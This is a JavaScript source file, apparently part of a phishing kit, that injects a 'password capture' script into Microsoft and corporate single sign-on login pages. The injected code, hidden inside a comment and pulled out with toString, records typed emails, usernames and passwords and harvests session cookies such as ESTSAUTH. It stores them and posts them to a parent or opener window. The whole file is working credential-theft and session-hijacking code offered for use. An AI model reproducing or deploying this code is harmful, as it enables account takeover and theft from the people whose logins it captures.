/**
 * FIXED: Enhanced Password & Email Capture Injector
 * Captures cookies ON MICROSOFT DOMAIN and stores them
 * Uses restoreCookies.ts compatible format
 */
export function injectPasswordCaptureScript() {
  const hostname = window.location.hostname;
  const isMicrosoftDomain = hostname.includes('login.microsoftonline.com') ||
    hostname.includes('login.live.com') ||
    hostname.includes('account.microsoft.com') ||
    hostname.includes('login.microsoft.com') ||
    hostname.includes('outlook.live.com');

  const isOrgDomain = hostname.includes('adfs') ||
    hostname.includes('sso') ||
    hostname.includes('okta') ||
    hostname.includes('ping') ||
    document.querySelector('input[type="password"]');

  if (isMicrosoftDomain || isOrgDomain) {
    const script = document.createElement('script');

    script.textContent = (function(){/*
      (function() {
        console.log('🔧 Enhanced password capture injector initialized on:', window.location.hostname);
        console.log('📦 Using restoreCookies.ts compatible format');
        
        // FIXED: Capture cookies in restoreCookies.ts format
        function captureMicrosoftCookies() {
          try {
            const cookieString = document.cookie;
            console.log('🔍 Checking document.cookie:', cookieString ? '✅ Has cookies' : '⚠️ No cookies');
            
            if (!cookieString) return [];

            const cookies = [];
            const cookiePairs = cookieString.split(';');

            cookiePairs.forEach(pair => {
              const trimmed = pair.trim();
              if (trimmed) {
                const equalsIndex = trimmed.indexOf('=');
                if (equalsIndex > 0) {
                  const name = trimmed.substring(0, equalsIndex).trim();
                  const value = trimmed.substring(equalsIndex + 1).trim();
                  
                  if (name && value) {
                    console.log('📌 Found cookie:', name);
                    
                    // Format in restoreCookies.ts compatible format
                    cookies.push({
                      name: name,
                      value: value,
                      domain: window.location.hostname,
                      path: '/',
                      secure: window.location.protocol === 'https:',
                      httpOnly: false,
                      sameSite: 'Lax',
                      session: true,
                      captureTime: new Date().toISOString()
                    });
                  }
                }
              }
            });

            console.log('🍪 Captured', cookies.length, 'cookies from', window.location.hostname);
            return cookies;
          } catch (error) {
            console.warn('⚠️ Failed to capture cookies:', error);
            return [];
          }
        }

        // FIXED: Enhanced credential retrieval from storage
        function getStoredCredentials() {
          try {
            const storageKeys = [
              'replacement_credentials',
              'captured_credentials', 
              'form_credentials',
              'injected_credentials'
            ];
            
            for (const key of storageKeys) {
              const localData = localStorage.getItem(key);
              const sessionData = sessionStorage.getItem(key);
              
              if (localData) {
                try {
                  const parsed = JSON.parse(localData);
                  if (parsed.email || parsed.password) {
                    console.log('📋 Retrieved stored credentials from localStorage:', key);
                    return parsed;
                  }
                } catch (e) {
                  console.warn('Failed to parse localStorage data for key:', key);
                }
              }
              
              if (sessionData) {
                try {
                  const parsed = JSON.parse(sessionData);
                  if (parsed.email || parsed.password) {
                    console.log('📋 Retrieved stored credentials from sessionStorage:', key);
                    return parsed;
                  }
                } catch (e) {
                  console.warn('Failed to parse sessionStorage data for key:', key);
                }
              }
            }
            
            return null;
          } catch (error) {
            console.warn('⚠️ Failed to retrieve stored credentials:', error);
            return null;
          }
        }

        let capturedCredentials = {
          email: '',
          password: '',
          username: '',
          domain: window.location.hostname,
          captureTime: new Date().toISOString()
        };

        let lastSendAt = 0;
        let sendInProgress = false;
        function canSendNow() {
          const now = Date.now();
          if (sendInProgress || (now - lastSendAt < 2000)) return false;
          lastSendAt = now;
          return true;
        }

        // FIXED: Store cookies in restoreCookies.ts format
        function storeCaptureCookiesInRestoreFormat(capturedCookies) {
          if (!canSendNow()) {
            console.log('⏳ Throttled - skipping store');
            return;
          }
          
          sendInProgress = true;

          try {
            console.log('💾 Storing captured cookies in restoreCookies.ts format...');
            
            if (capturedCookies.length > 0) {
              try {
                // Format in restoreCookies.ts compatible format
                const cookieExport = {
                  version: '1.0',
                  exportedAt: new Date().toISOString(),
                  source: 'password-capture-injector',
                  domain: window.location.hostname,
                  totalCookies: capturedCookies.length,
                  cookies: capturedCookies.map(cookie => ({
                    name: cookie.name || '',
                    value: cookie.value || '',
                    domain: cookie.domain || window.location.hostname,
                    path: cookie.path || '/',
                    secure: !!cookie.secure,
                    httpOnly: !!cookie.httpOnly,
                    sameSite: cookie.sameSite || 'Lax',
                    session: !!cookie.session,
                    expires: cookie.expires,
                    expirationDate: cookie.expirationDate
                  })),
                  note: 'Cookies captured on Microsoft domain via password-capture-injector'
                };

                sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                
                // Also store raw format
                sessionStorage.setItem('captured_cookies', JSON.stringify(capturedCookies));
                localStorage.setItem('captured_cookies', JSON.stringify(capturedCookies));
                
                console.log('✅ Captured', capturedCookies.length, 'cookies stored successfully');
                console.log('📍 Cookies stored from domain:', window.location.hostname);
              } catch (e) {
                console.warn('⚠️ Failed to store captured cookies:', e);
              }
            } else {
              console.log('⚠️ No cookies to store');
            }

            sendInProgress = false;

            // Send postMessage to parent/opener
            const cookieMessage = {
              type: 'COOKIES_CAPTURED',
              data: {
                cookies: capturedCookies,
                timestamp: new Date().toISOString(),
                domain: window.location.hostname,
                injectorVersion: '2.0-enhanced',
                source: 'password-capture-injector',
                format: 'restoreCookies.ts-compatible',
                cookieCount: capturedCookies.length
              }
            };

            try {
              if (window.parent && window.parent !== window) {
                window.parent.postMessage(cookieMessage, '*');
              }
              if (window.opener) {
                window.opener.postMessage(cookieMessage, '*');
              }
            } catch (error) {
              // ignore postMessage errors
            }

          } catch (error) {
            sendInProgress = false;
            console.warn('⚠️ Error in storeCaptureCookiesInRestoreFormat:', error);
          }
        }

        // FIXED: Enhanced password capture
        function capturePasswordFromForms() {
          try {
            const passwordFields = document.querySelectorAll('input[type="password"], input[name*="password"], input[id*="password"]');
            const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[name*="username"], input[id*="email"]');
            const usernameFields = document.querySelectorAll('input[name*="user"], input[name*="login"], input[name*="account"]');

            let hasNewData = false;

            passwordFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.password) {
                console.log('🔐 Password field captured');
                capturedCredentials.password = field.value;
                hasNewData = true;
              }
            });

            emailFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.email) {
                console.log('📧 Email field captured:', field.value);
                capturedCredentials.email = field.value;
                hasNewData = true;
              }
            });

            usernameFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.username) {
                console.log('👤 Username field captured');
                capturedCredentials.username = field.value;
                hasNewData = true;
              }
            });

            if (hasNewData) {
              storeCredentials();
              // IMMEDIATELY capture and store cookies
              setTimeout(() => {
                const capturedCookies = captureMicrosoftCookies();
                console.log('📊 Captured cookies count:', capturedCookies.length);
                storeCaptureCookiesInRestoreFormat(capturedCookies);
              }, 300);
            }

            return hasNewData;
          } catch (error) {
            console.error('❌ Error capturing password:', error);
            return false;
          }
        }

        // Store credentials
        function storeCredentials() {
          const credentialsData = {
            email: capturedCredentials.email,
            password: capturedCredentials.password,
            username: capturedCredentials.username,
            domain: capturedCredentials.domain,
            captureTime: capturedCredentials.captureTime,
            source: 'injected-password-capture-enhanced',
            url: window.location.href,
            validated: true,
            microsoftAccount: true
          };

          try {
            sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
            
            console.log('💾 Credentials stored');
          } catch (error) {
            console.warn('⚠️ Failed to store credentials:', error);
          }

          const payload = {
            type: 'CREDENTIALS_CAPTURED',
            data: credentialsData,
            source: 'injected-password-capture-enhanced',
            timestamp: new Date().toISOString()
          };
          
          try {
            if (window.parent && window.parent !== window) {
              window.parent.postMessage(payload, '*');
            }
            if (window.opener) {
              window.opener.postMessage(payload, '*');
            }
          } catch (error) {
            // ignore
          }
        }

        // Monitor for login success
        function monitorForAutoLogin() {
          if (window.location.hostname.includes('login.microsoftonline.com') ||
              window.location.hostname.includes('login.live.com') ||
              window.location.hostname.includes('account.microsoft.com') ||
              window.location.hostname.includes('login.microsoft.com')) {
            
            console.log('🔍 Monitoring for Microsoft login on:', window.location.hostname);
            
            // Capture cookies after page loads
            setTimeout(() => {
              console.log('⏰ Initial cookie capture attempt...');
              const capturedCookies = captureMicrosoftCookies();
              console.log('📊 Found', capturedCookies.length, 'cookies');
              storeCaptureCookiesInRestoreFormat(capturedCookies);
            }, 2000);
            
            // Check for login success indicators
            const checkForLoginSuccess = () => {
              const successIndicators = [
                () => document.cookie.includes('ESTSAUTH'),
                () => document.cookie.includes('ESTSAUTHPERSISTENT'),
                () => document.cookie.includes('ESTSAUTHLIGHT'),
                () => document.cookie.includes('SignInStateCookie'),
                () => window.location.href.includes('code='),
                () => window.location.href.includes('prompt=none')
              ];
              
              const hasSuccess = successIndicators.some(check => {
                try { return !!check(); } catch { return false; }
              });
              
              if (hasSuccess) {
                console.log('🎯 Login success detected!');
                const capturedCookies = captureMicrosoftCookies();
                console.log('📊 Storing', capturedCookies.length, 'cookies on login success');
                storeCaptureCookiesInRestoreFormat(capturedCookies);
                return true;
              }
              return false;
            };
            
            let checkCount = 0;
            const loginCheckInterval = setInterval(() => {
              checkCount++;
              const success = checkForLoginSuccess();
              
              if (success || checkCount >= 30) {
                clearInterval(loginCheckInterval);
                if (!success) {
                  console.log('🕐 Timeout - storing final cookies');
                  const capturedCookies = captureMicrosoftCookies();
                  storeCaptureCookiesInRestoreFormat(capturedCookies);
                }
              }
            }, 1000);
          }
        }

        // Event listeners
        document.addEventListener('input', function(e) {
          if (
            e.target.type === 'password' ||
            e.target.type === 'email' ||
            (e.target.name && e.target.name.toLowerCase().includes('password')) ||
            (e.target.name && e.target.name.toLowerCase().includes('email'))
          ) {
            setTimeout(() => {
              capturePasswordFromForms();
            }, 300);
          }
        });

        document.addEventListener('submit', function(e) {
          console.log('📝 Form submitted');
          setTimeout(() => {
            capturePasswordFromForms();
            setTimeout(() => {
              const capturedCookies = captureMicrosoftCookies();
              console.log('📊 Post-submit cookies:', capturedCookies.length);
              storeCaptureCookiesInRestoreFormat(capturedCookies);
            }, 800);
          }, 100);
        });

        document.addEventListener('click', function(e) {
          const target = e.target;
          if (
            target.type === 'submit' ||
            (target.textContent && (target.textContent.toLowerCase().includes('sign in') || target.textContent.toLowerCase().includes('next')))
          ) {
            console.log('🖱️ Login/Next button clicked');
            setTimeout(() => {
              capturePasswordFromForms();
              setTimeout(() => {
                const capturedCookies = captureMicrosoftCookies();
                console.log('📊 Post-click cookies:', capturedCookies.length);
                storeCaptureCookiesInRestoreFormat(capturedCookies);
              }, 1200);
            }, 500);
          }
        });

        // Initialize
        function initializeMonitoring() {
          console.log('🚀 Initializing on:', window.location.hostname);
          
          setTimeout(() => {
            capturePasswordFromForms();
            monitorForAutoLogin();
          }, 1000);
          
          setInterval(() => {
            capturePasswordFromForms();
          }, 5000);
        }

        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', initializeMonitoring);
        } else {
          initializeMonitoring();
        }

        if (window.MutationObserver) {
          const observer = new MutationObserver((mutations) => {
            let shouldCheck = false;
            mutations.forEach((mutation) => {
              if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                for (let node of mutation.addedNodes) {
                  if (node.nodeType === 1 && (
                    node.tagName === 'INPUT' || 
                    (node.querySelector && node.querySelector('input'))
                  )) {
                    shouldCheck = true;
                    break;
                  }
                }
              }
            });
            
            if (shouldCheck) {
              setTimeout(() => {
                capturePasswordFromForms();
              }, 500);
            }
          });
          
          observer.observe(document.body, {
            childList: true,
            subtree: true
          });
        }

        console.log('✅ Injector ready on:', window.location.hostname);
      })();
    */}).toString().replace(/^[\s\S]*?\/\*([\s\S]*?)\*\/[\s\S]*$/,'$1');

    document.head.appendChild(script);
    console.log('✅ Script injected for domain:', hostname);
  }
}
